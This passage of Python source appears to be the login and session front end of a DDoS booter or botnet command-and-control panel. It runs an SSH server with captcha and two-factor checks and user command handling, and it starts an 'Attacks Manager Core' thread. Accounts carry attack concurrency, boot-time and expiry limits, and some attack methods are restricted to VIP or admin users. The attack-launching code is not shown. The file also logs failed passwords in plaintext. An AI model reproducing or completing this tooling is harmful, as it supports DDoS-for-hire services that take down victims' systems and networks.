            return False, "<%color.red>Only administrators can use desired method.<%color.reset>"

        if moderation['vip_method'] and not is_vip(user):
            return False, "<%color.red>Only V.I.P's can use desired method.<%color.reset>"

        return True, ""

def handler(sock, user):
    global luc, lives
    luc[user] = []
    clear(sock)
    sock.settimeout(86400)
    threading.Thread(target=load, args=(sock, user)).start()
    debugv=False
    sock.send(core.process(core.banners('banner'), sock))
    while sock in list(lives.keys()):
        sock.send(core.process(command_line, sock).encode())
        try:
            command=receive(sock, user=user, debug=debugv)
            if command != '' and not command.startswith('#'): luc[user].append(command)
            if command == 'clear' or command == 'clean' or command == 'cls':
                clear(sock)
                sock.send(core.process(core.banners('banner'), sock))
            elif command == 'exit' or command == 'EXIT' or command == 'Exit' or command == 'quit':
                for i in range(3):
                    sock.send(f' Exiting in {3-i} seconds\r')
                    time.sleep(1)
                sock.close()
                del lives[sock]
                return
            elif command == 'echo':
                sock.send('echo> ')
                x=receive(sock, user=user, debug=debugv)
                sock.send(f'\x1b[F{x}          \r\n'.encode())
            elif command.startswith('debug') and user in super_users:
                if command.endswith('enable'):
                    if debugv == False:
                        debugv = True
                        sock.send(f'Debug activated, all infos will be showed as raw.\r\n'.encode())
                        log('DebugFunction', f"account: {username} enable the debug function")
                    else:
                        sock.send(f'Ur debug is already enable.\r\n'.encode())
                elif command.endswith('disable'):
                    debugv = False
                    sock.send(f'Debug deactivated.\r\n'.encode())
                else:
                    sock.send(f'##########################\r\n'.encode())
                    sock.send(f'# debug <{c.GREEN}enable{c.R}/{c.RED}disable{c.R}> #\r\n'.encode())
                    sock.send(f'##########################\r\n'.encode())
            elif command == 'reload' and user in super_users:
                loadConfigs(sock=sock)
                log('Reloading', f"{username} reloaded the CNC")
            elif command == 'history':
                for i in luc[user]:
                    sock.send(f'{i}\r\n'.encode())
            elif command in commands:
                sock.send(core.process(core.banners(command), sock, addbreak=True))
                log('Commands', f"{username} executed: {command}")
            else:
                if not command.startswith('#'):
                    sock.send(f'This command do not exist.\r\n'.encode())
        except Exception as e:
            if debugv:
                print(e)
            if str(e) == 'timed out':
                del lives[sock]
                return 2
def login(sock, addr):
    global lives
    try:
        sock.settimeout(240)
        #print(f"Conectado por {addr[0]}")
        transport = paramiko.Transport(sock)
        transport.local_version = SSH_BANNER
        username = ""
        password = ""
        server = Server()
        transport.add_server_key(host_key)
        transport.start_server(server=server)
        sock = transport.accept(100)
        cred = server.get_credentials()
        username = cred['user']
        password = cred['passwd']
        response = ''
        finalx   = '' 
        if security_level != 0:
            settitle(sock, "Captcha")
            sock.send(b'\033[0mcaptcha to confirm you\'re a human:\r\n')
        if security_level == 1:
            y, x = random.randint(1, 20), random.randint(1, 20)
            finalx = y+x
            sock.send(f'calc it: {c.BG_WHITE+random.choice([c.BLACK, c.RED, c.YELLOW])+" "+str(y)} + {str(x)+" "+c.R} = '.encode())
            try:
                response = int(receive(sock))
            except Exception as e:
                print(e)
                return
        elif security_level == 2:
            finalx = core.rstring(5)
            asciix = pyfiglet.Figlet(font=random.choice(['slant', 'standard', '3-D', 'banner'])).renderText(finalx[0]).splitlines()
            for i in asciix:
                sock.send(f'{c.BG_WHITE+c.BLACK+i+c.R}\r\n'.encode())
            sock.send(f'\r\nWrite back the ascii(example: UxGZw): '.encode())
            finalx=finalx[1]
            response = receive(sock)
        elif security_level == 3:
            finalx = random.choice(['bus', 'computer', 'apple', 'linux', 'controller'])
            asciix = random.choice(capimages[finalx]).splitlines()
            for i in asciix:
                sock.send(f'{i}\r\n'.encode())
            sock.send(f'\r\nWhat is that(example: apple): '.encode())
            response = receive(sock)
        elif security_level == 4:
            otpshit = core.seek(username, 'first'), core.seek(username, 'otp')
            if otpshit[0] == 1:
                magic, qcode = core.twofactor(username)
                sock.send('Scan this with the preferred 2FA application, like google authenticator.\r\n')
                sock.send(f'Secret: {magic}.\r\n')
                sock.send('After that put the 6 digits code.')
                for i in qcode:
                    sock.send(f'{i}\r\n'.encode())
                sock.settimeout(600)
                finalx = True

                for i in range(3):
                    sock.send(f'Two Factor authenticator {i+1} try.\r\n\r\n{c.BG_WHITE+c.BLACK} _ _ _ _ _ _ \r ')
                    response = receive(sock, justnumbers=True, limitc=6, returnset='%c ')
                    response = pyotp.TOTP(magic).verify(response)
                    if response == True:
                        core.modifyuser(username, 'first', 0)
                        core.modifyuser(username, 'otp', magic)
                        break
                    else:
                        sock.send('Invalid 2fa code, try again\r\n')
            else:
                sock.settimeout(600)
                finalx = True
                for i in range(3):
                    sock.send(f'Two Factor authenticator {i+1}/3 try.\r\n\r\n{c.BG_WHITE+c.BLACK} _ _ _ _ _ _ \r ')
                    response = receive(sock, justnumbers=True, limitc=6, returnset='%c ')
                    response = pyotp.TOTP(otpshit[1]).verify(response)
                    if response == True:
                        break
                    else:
                        sock.send('Invalid 2fa code, try again\r\n')
        if response == finalx and security_level >= 0 and security_level <= 4:
            for i in spinner:
                sock.send(f' [{c.CYAN}{i}{c.R}] checking if you\'ve an valid login...\r'.encode())
                time.sleep(0.5)
            check = core.checklogin(username, password)
            if check:
                pass
            else:
                sock.send(f'\r Invalid login or password.              \r'.encode())
                log('LoginCore', f"Login failed: {username}:{password} | ip: {addr[0]}")
                time.sleep(3)
                sock.close()
                return
            for i in spinner:
                sock.send(f' [{c.CYAN}{i}{c.R}] checking other things...               \r'.encode())
                time.sleep(0.5)
            if core.findsessions(addr[0], username) == 1:
                sock.send(f' You\'re already in a session.              \r'.encode())
                time.sleep(3)
                sock.close()
                return
            for i in spinner:
                sock.send(f' [{c.CYAN}{i}{c.R}]  Alright {username}, pluging you to main server...\r'.encode())
                time.sleep(0.5)
            sock.send(b'\r\n')
            lives[sock] = {
                "user": username,
                "uptime": int(time.time()),
                "addr": addr[0],
                "concurrents": check['concurrents'],
                "boottime": check['boottime'],
                "created_by": check['created_by'],
                "expiry": check['expiry'],
            }
            print(f"[{c.GREEN}Login{c.R}] {username} logged in.")
            handler(sock, username)
        else:
            sock.send(f'Wrong answer, closing connection.'.encode())
            time.sleep(3)
            sock.close()
            return
    except Exception as e:
        try:
            sock.close()
        except:
            pass
        return
def run_server():
    HOST = '0.0.0.0'
    PORT = int(sys.argv[1])
    sockx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sockx.bind((HOST, PORT))
    sockx.listen(100)
    print(f"[{c.GREEN}Server{c.R}] Started successfully.")
    while True:
        sock, addr = sockx.accept()
        threading.Thread(target=login, args=(sock, addr)).start()

# - - - - - -
# - - - - - -
# end ^w^
# - - - - - -
# - - - - - -

if __name__ == "__main__":
    if os.path.exists('Settings/config.json') and os.path.exists('Settings/funnel.json') and os.path.exists('Database/logins.json'):
        print(f'[{c.GREEN}Server{c.R}] Configs, funnels and logins exist.')
        print(f'[{c.GREEN}Server{c.R}] Starting config loader thread...')
        loadConfigs()
        print(f'[{c.GREEN}Server{c.R}] Starting AMC(Attacks Manager Core) thread...')
        threading.Thread(target=amc.arac).start()
        run_server()
    else:
        print(f'[{c.RED}Fatal{c.R}] u dont have the main settings files(Settings[config.json, funnel.json], Database[logins.json]).')
